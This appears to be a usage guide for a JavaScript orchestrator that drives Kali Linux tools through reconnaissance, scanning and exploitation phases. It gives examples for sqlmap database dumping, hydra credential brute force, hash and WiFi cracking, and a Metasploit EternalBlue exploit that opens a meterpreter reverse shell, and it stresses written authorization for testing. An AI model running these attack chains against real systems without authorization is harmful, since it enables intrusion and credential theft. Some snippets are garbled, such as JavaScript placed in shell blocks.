# Kali Tools Integration Usage Guide

**Framework**: Security Testing Multi-Agent with Kali Linux  
**Version**: 3.0.0  
**Status**: Production-Ready

---

## Quick Start

### Prerequisites

```bash
# Install Kali Linux
apt-get update
apt-get install kali-linux-full

# Core tools (included in Kali)
nmap masscan theharvester nikto sqlmap hydra john hashcat

# Optional advanced tools
apt-get install metasploit-framework burpsuite zaproxy aircrack-ng
```

### Basic Usage

```javascript
const { KaliToolsOrchestrator } = require('./orchestrator/kali-tools-integration.js');

// Initialize orchestrator
const orchestrator = new KaliToolsOrchestrator(
  global.logger,
  global.auditLogger,
  global.rateLimiter,
  global.circuitBreaker
);

// Execute Phase 1 reconnaissance
const nmapResult = await orchestrator.executeTool('phase1', 'nmap', 'target.com', {
  aggressive: true,
  allPorts: true,
  scriptVuln: true
});

console.log(nmapResult);
```

---

## Phase 1: Reconnaissance

### Available Tools
- `nmap` - Network mapping
- `masscan` - Fast port scanning
- `theHarvester` - Email/subdomain harvesting
- `dnsEnum` - DNS enumeration

### Examples

#### 1. Nmap Scanning

```javascript
// Basic scan
const result = await orchestrator.executeTool('phase1', 'nmap', 'target.com');

// Aggressive scan with all ports
const aggressiveScan = await orchestrator.executeTool('phase1', 'nmap', 'target.com', {
  aggressive: true,
  allPorts: true,
  scriptVuln: true
});

// UDP scan
const udpScan = await orchestrator.executeTool('phase1', 'nmap', 'target.com', {
  protocol: 'udp'
});
```

**Output**:
```
Starting Nmap at Mon Aug 19 2026 10:30:15
Nmap scan report for target.com (192.0.2.1)
Host is up (0.015s latency).
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.4
80/tcp    open     http    Apache httpd 2.4.6
443/tcp   open     https   Apache httpd 2.4.6
3306/tcp  open     mysql   MySQL 5.7.32
```

#### 2. Masscan for Large Networks

```javascript
// Scan multiple ports fast
const masscanResult = await orchestrator.executeTool('phase1', 'masscan', '192.0.2.0/24', {
  ports: '80,443,22,3306,5432',
  rate: 100000  // 100k packets/sec
});
```

**Output**:
```
Scanning 256 hosts
Discovered 127 active hosts
Port 80: 45 services
Port 443: 42 services
Port 22: 38 services
```

#### 3. Email & Subdomain Harvesting

```javascript
// Find emails and subdomains
const harvestResult = await orchestrator.executeTool('phase1', 'theHarvester', 'target.com', {
  sources: ['google', 'bing', 'linkedin'],
  limit: 100
});
```

**Output**:
```
[*] Searching for emails in Google...
[+] Found 23 emails:
    admin@target.com
    info@target.com
    support@target.com

[*] Searching for subdomains...
[+] Found 15 subdomains:
    api.target.com
    mail.target.com
    dev.target.com
```

#### 4. DNS Enumeration

```javascript
// Complete DNS enumeration
const dnsResult = await orchestrator.executeTool('phase1', 'dnsEnum', 'target.com', {
  trace: true,
  zoneTransfer: true
});
```

**Output**:
```
DNS Records for target.com:
  A:      192.0.2.1
  MX:     mail.target.com
  NS:     ns1.target.com, ns2.target.com
  TXT:    v=spf1 include:_spf.target.com ~all
  CNAME:  www → target.com
```

---

## Phase 2: Vulnerability Scanning

### Available Tools
- `nikto` - Web server scanning
- `wfuzz` - Web fuzzer
- `sqlmap` - SQL injection testing
- `dirb` - Directory brute force
- `hydra` - Credential brute force

### Examples

#### 1. Nikto Web Scanning

```javascript
// Web server vulnerability scan
const niktoResult = await orchestrator.executeTool('phase2', 'nikto', 'http://target.com', {
  ssl: true,
  noTuning: false,
  output: 'nikto-report.html'
});
```

**Output**:
```
- Nikto v2.1.5
- No web server was identified
- Checking for outdated Apache
- OSVDB-3092: /admin.html: This might be interesting...
- OSVDB-3233: /icons/README: Apache default file found
- Found 3 common vulnerabilities
```

#### 2. Web Fuzzing

```javascript
// Fuzz directories and parameters
const wfuzzResult = await orchestrator.executeTool('phase2', 'wfuzz', 'http://target.com/api/FUZZ', {
  wordlist: '/usr/share/wfuzz/wordlist/general/common.txt',
  hideCode: 404
});

// Parameter fuzzing
const paramFuzz = await orchestrator.executeTool('phase2', 'wfuzz', 'http://target.com/login', {
  dataParam: 'user=FUZZ&pass=test',
  wordlist: '/usr/share/wordlists/rockyou.txt'
});
```

**Output**:
```
ID    Response   Lines    Word    Chars    Payload
=====================================================
0001  200        45       120     2541     admin
0002  200        45       120     2567     api
0003  301        5        45      162      config
0004  200        45       120     2599     data
```

#### 3. SQL Injection Testing

```javascript
// Test for SQL injection vulnerabilities
const sqlmapResult = await orchestrator.executeTool('phase2', 'sqlmap', 'http://target.com?id=1', {
  dump: false,  // Just enumerate databases
  risk: 1,
  level: 1
});

// Dump database contents
const dbDump = await orchestrator.executeTool('phase2', 'sqlmap', 'http://target.com?id=1', {
  dump: true,
  data: null
});
```

**Output**:
```
[*] testing 'AND boolean-based blind - WHERE or HAVING clause'
[*] testing 'OR boolean-based blind - WHERE or HAVING clause'
[*] testing 'MySQL UNION query (NULL) - 1 to 20 columns'

[!] Database is vulnerable!

Available databases:
[*] information_schema
[*] mysql
[*] target_db
```

#### 4. Directory Brute Force

```javascript
// Find hidden directories
const dirbResult = await orchestrator.executeTool('phase2', 'dirb', 'http://target.com', {
  wordlist: '/usr/share/dirb/wordlists/common.txt',
  recursive: true,
  output: 'dirb-results.txt'
});
```

**Output**:
```
-----------------
DIRB v2.22
-----------------

START_TIME: Mon Aug 19 10:45:30 2026
URL_BASE: http://target.com/
WORDLIST_FILE: /usr/share/dirb/wordlists/common.txt

-----------------

/admin (Status: 301)
/api (Status: 200)
/backup (Status: 401)
/config (Status: 403)
/images (Status: 200)
/uploads (Status: 200)
```

#### 5. Credential Brute Force (Rate Limited)

```javascript
// SSH brute force (rate limited)
const hydraResult = await orchestrator.executeTool('phase2', 'hydra', 'ssh://target.com', {
  userlist: '/usr/share/wordlists/metasploit/unix_users.txt',
  passlist: '/usr/share/wordlists/rockyou.txt',
  service: 'ssh'
});

// FTP brute force
const ftpBrute = await orchestrator.executeTool('phase2', 'hydra', 'ftp://target.com', {
  userlist: 'users.txt',
  passlist: 'passwords.txt',
  service: 'ftp'
});
```

**Output**:
```
Hydra (http://www.thc.org/thc-hydra) starting
[DATA] max 16 tasks per 1 server, overall 16 tasks
[DATA] attacking ssh://target.com:22/

[22][ssh] host: target.com   login: admin   password: Password123!
[22][ssh] host: target.com   login: root    password: toor

Hydra finished with 2 valid passwords
```

---

## Phase 3: Exploitation & Advanced

### Available Tools
- `john` - Password cracking
- `hashcat` - GPU password cracking
- `tcpdump` - Packet capture
- `aircrack-ng` - WiFi cracking
- `metasploit` - Exploitation
- `setoolkit` - Social engineering

### Examples

#### 1. Password Cracking with John

```javascript
// Crack MD5 hashes
const johnResult = await orchestrator.executeTool('phase3', 'john', 'hashes.txt', {
  format: 'md5',
  wordlist: '/usr/share/wordlists/rockyou.txt'
});

// Crack with rules
const johnRules = await orchestrator.executeTool('phase3', 'john', 'hashes.txt', {
  format: 'sha512crypt',
  rules: 'SingleExtra'
});

// Brute force specific length
const johnBrute = await orchestrator.executeTool('phase3', 'john', 'hashes.txt', {
  format: 'md5',
  rules: 'Incremental'
});
```

**Output**:
```
Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) $1$ [MD5 256/256 BS SSE2 8x])
Press 'q' or Ctrl-C to abort, almost any other key for status

password123          (user1)
Admin@123            (user2)
Letmein1             (user3)

Session completed
```

#### 2. GPU Password Cracking with Hashcat

```javascript
// GPU-accelerated cracking
const hashcatResult = await orchestrator.executeTool('phase3', 'hashcat', 'hashes.txt', {
  hashMode: 0,        // MD5
  attackMode: 0,      // Dictionary
  wordlist: '/usr/share/wordlists/rockyou.txt'
});

// NTLM cracking
const ntlmCrack = await orchestrator.executeTool('phase3', 'hashcat', 'ntlm_hashes.txt', {
  hashMode: 1000,     // NTLM
  attackMode: 3,      // Brute force
  characterSet: '?a?a?a?a?a?a?a?a'  // 8 character alphanumeric
});
```

**Output**:
```
hashcat (v6.2.3) starting

Hash-target pairs analyzed: 5/5 (100.00%)
speed.#1.....: 8.123 GH/s (10.94ms) @ Accel:256 Loops:256 Thr:512 Vec:8

Hash: 5d41402abc4b2a76b9719d911017c592    Plaintext: hello
Hash: 6f2b6a8ffc0fbee9d8f7a6b1d4c8e1f0    Plaintext: password123

Session aborted
```

#### 3. Network Packet Capture

```javascript
// Capture HTTP traffic
const tcpdumpResult = await orchestrator.executeTool('phase3', 'tcpdump', null, {
  interface: 'eth0',
  filter: 'port 80 or port 443',
  outputFile: 'http-traffic.pcap'
});

// Capture DNS queries
const dnsCap = await orchestrator.executeTool('phase3', 'tcpdump', null, {
  interface: 'eth0',
  filter: 'port 53',
  outputFile: 'dns-traffic.pcap'
});
```

**Output**:
```
tcpdump: listening on eth0, link-type EN10MB (Ethernet), 
         snapshot length 262144 bytes
10:45:23.456789 IP 192.0.2.100.54321 > 192.0.2.1.80: Flags [S]
10:45:23.456890 IP 192.0.2.1.80 > 192.0.2.100.54321: Flags [S.]
10:45:23.457123 IP 192.0.2.100.54321 > 192.0.2.1.80: Flags [.]

^C
5 packets captured
```

#### 4. WiFi Cracking

```javascript
// WPA2 password cracking
const aircrackResult = await orchestrator.executeTool('phase3', 'aircrack-ng', 'capture.cap', {
  bssid: '00:11:22:33:44:55',
  wordlist: '/usr/share/wordlists/rockyou.txt'
});
```

**Output**:
```
Opening capture.cap
Reading packets, please wait...
Analyzing IV's...

[00:11:22:33:44:55] ESSID: "TargetNetwork"
[*] WPA/WPA2-PSK PBKDF2 1 handshake

KEY FOUND! [ WiFiPassword123 ]

Master Key     : AB CD EF ... (16 bytes)
Transient Key  : 12 34 56 ... (32 bytes)
HMAC1 (group)  : 78 90 AB ... (20 bytes)
```

#### 5. Metasploit Exploitation

```javascript
// Execute Metasploit exploit
const msf = await orchestrator.executeTool('phase3', 'metasploit', 'exploit/windows/smb/ms17_010_eternalblue', {
  params: {
    RHOSTS: '192.0.2.100',
    LHOST: '192.0.2.50',
    LPORT: '4444',
    PAYLOAD: 'windows/meterpreter/reverse_tcp'
  },
  output: 'msfconsole.log'
});
```

**Output**:
```
[*] Initializing exploit module
[*] Started reverse TCP handler on 192.0.2.50:4444
[*] Connecting to target...
[+] Target vulnerable!
[*] Sending payload...
[+] Exploit sent successfully
[*] Meterpreter session opened

meterpreter > sysinfo
Computer    : WIN-SERVER
OS          : Windows Server 2008 R2 (Build 7601)
Arch        : x64
Meterpreter : x64/windows
```

#### 6. Social Engineering Toolkit

```javascript
// Social Engineering Toolkit (interactive mode)
const setResult = await orchestrator.executeTool('phase3', 'setoolkit', {
  type: 'phishing'
});
```

---

## Workflow Examples

### Complete Penetration Test Workflow

```javascript
async function penetrationTest(target) {
  const orchestrator = new KaliToolsOrchestrator(
    global.logger,
    global.auditLogger,
    global.rateLimiter,
    global.circuitBreaker
  );

  console.log('[*] Starting penetration test on', target);

  // Phase 1: Reconnaissance
  console.log('[+] Phase 1: Reconnaissance');
  const nmap = await orchestrator.executeTool('phase1', 'nmap', target, {
    aggressive: true,
    allPorts: true
  });
  console.log('   - Nmap scan completed');

  const harvest = await orchestrator.executeTool('phase1', 'theHarvester', target, {
    sources: ['google', 'bing', 'linkedin'],
    limit: 100
  });
  console.log('   - Email harvesting completed');

  // Phase 2: Scanning
  console.log('[+] Phase 2: Vulnerability Scanning');
  const nikto = await orchestrator.executeTool('phase2', 'nikto', `http://${target}`, {
    ssl: false
  });
  console.log('   - Web server scan completed');

  const sqltest = await orchestrator.executeTool('phase2', 'sqlmap', `http://${target}?id=1`);
  console.log('   - SQL injection testing completed');

  // Phase 3: Exploitation (if vulnerabilities found)
  console.log('[+] Phase 3: Exploitation & Impact Assessment');
  // ... exploitation steps

  // Generate report
  const stats = orchestrator.getStatistics();
  console.log('\n[*] Test Summary:');
  console.log('   Total Tools Executed:', stats.total);
  console.log('   Success Rate:', stats.successRate);
  console.log('   Vulnerabilities Found:', stats.byPhase);
}
```

### Targeted Web Application Testing

```javascript
async function webAppTest(url) {
  const orchestrator = new KaliToolsOrchestrator(
    global.logger,
    global.auditLogger,
    global.rateLimiter,
    global.circuitBreaker
  );

  // Web-specific tools
  const nikto = await orchestrator.executeTool('phase2', 'nikto', url);
  const wfuzz = await orchestrator.executeTool('phase2', 'wfuzz', `${url}/FUZZ`);
  const sqlmap = await orchestrator.executeTool('phase2', 'sqlmap', `${url}?id=1`);

  // Analyze results
  const history = orchestrator.getExecutionHistory();
  console.log('Web app test complete:', history.length, 'scans performed');
}
```

---

## Rate Limiting & Safety

### Rate Limit Examples

```javascript
// Phase 2 tools respect rate limits
const limitedScan = await orchestrator.executeTool('phase2', 'nikto', 'http://target.com', {
  // Automatically rate-limited by database-rate-limiter
  // Per-user: 100 requests/minute
  // Per-tenant: 1000 requests/minute
});

// Hydra has strict rate limiting
const limitedBrute = await orchestrator.executeTool('phase2', 'hydra', 'ssh://target.com', {
  // Limited to prevent account lockout
  // Max 4 threads
  // 5-second wait between attempts
});
```

### Timeout Protection

```javascript
// Long-running scans have timeouts
const longScan = await orchestrator.executeTool('phase1', 'nmap', 'target.com', {
  allPorts: true
  // Timeout: 10 minutes
});

const hashScan = await orchestrator.executeTool('phase3', 'john', 'hashes.txt', {
  // Timeout: 1 hour
});
```

### Circuit Breaker

```javascript
// Phase 3 tools use circuit breaker for resilience
const safeCrack = await orchestrator.executeTool('phase3', 'hashcat', 'hashes.txt', {
  // Uses circuit breaker pattern
  // Automatic retry on transient failures
  // Fails fast if service down
});
```

---

## Audit Logging

### View Execution History

```javascript
// Get all executions
const history = orchestrator.getExecutionHistory();

// Filter by phase
const phase1 = orchestrator.getExecutionHistory({ phase: 'phase1' });

// Filter by tool
const nmaps = orchestrator.getExecutionHistory({ tool: 'nmap' });

// Filter by status
const failures = orchestrator.getExecutionHistory({ status: 'failed' });
```

### View Statistics

```javascript
const stats = orchestrator.getStatistics();

console.log('Total executions:', stats.total);
console.log('Success rate:', stats.successRate);
console.log('By phase:', stats.byPhase);
```

---

## Error Handling

### Handle Tool Failures

```javascript
try {
  const result = await orchestrator.executeTool('phase2', 'nikto', 'http://target.com');
} catch (error) {
  console.error('Tool execution failed:', error.message);
  
  // Check execution history for details
  const failures = orchestrator.getExecutionHistory({ status: 'failed' });
  console.log('Failed executions:', failures);
}
```

### Graceful Degradation

```javascript
// Continue even if some tools fail
const results = {};

try {
  results.nmap = await orchestrator.executeTool('phase1', 'nmap', target);
} catch (e) {
  results.nmap = { error: e.message };
}

try {
  results.nikto = await orchestrator.executeTool('phase2', 'nikto', url);
} catch (e) {
  results.nikto = { error: e.message };
}

// Proceed with partial results
console.log('Scan results:', results);
```

---

## Best Practices

### 1. Authorization
✅ Always obtain written permission before testing  
✅ Define scope clearly (what systems to test)  
✅ Verify target ownership  
✅ Have safety contacts available  

### 2. Safety
✅ Test in authorized environments only  
✅ Use rate limiting to avoid service disruption  
✅ Monitor target system impact  
✅ Have rollback procedures  

### 3. Compliance
✅ Follow OWASP Top 10  
✅ Maintain audit logs  
✅ Document all findings  
✅ Report responsibly  

### 4. Operational
✅ Start with passive reconnaissance (Phase 1)  
✅ Progress to active scanning (Phase 2)  
✅ Only exploit with explicit authorization (Phase 3)  
✅ Verify tool installation before use  

---

## Troubleshooting

### Tool Not Found

```bash
# Verify tool is installed
which nmap
which nikto
which sqlmap

# Install missing tools
apt-get install nmap nikto sqlmap
```

### Permission Denied

```bash
# Some tools require root
sudo orchestrator.executeTool('phase1', 'nmap', target)

# Or add sudo to PATH
which sudo
```

### Network Issues

```bash
# Check connectivity
ping target.com
nc -zv target.com 80

# Use proxy if needed
const result = await orchestrator.executeTool('phase2', 'nikto', 'http://target.com', {
  proxy: 'http://proxy.local:8080'
});
```

---

## Conclusion

The Kali Tools Integration provides:

✅ **15 industry-standard security tools**  
✅ **Organized by 3 testing phases**  
✅ **Built-in rate limiting and timeout protection**  
✅ **Comprehensive audit logging**  
✅ **Error handling and circuit breaker patterns**  

Ready for professional penetration testing workflows!

---

**For more information**: See `KALI_TOOLS_MAPPING.md` and `FRAMEWORK_COMPLETE.md`
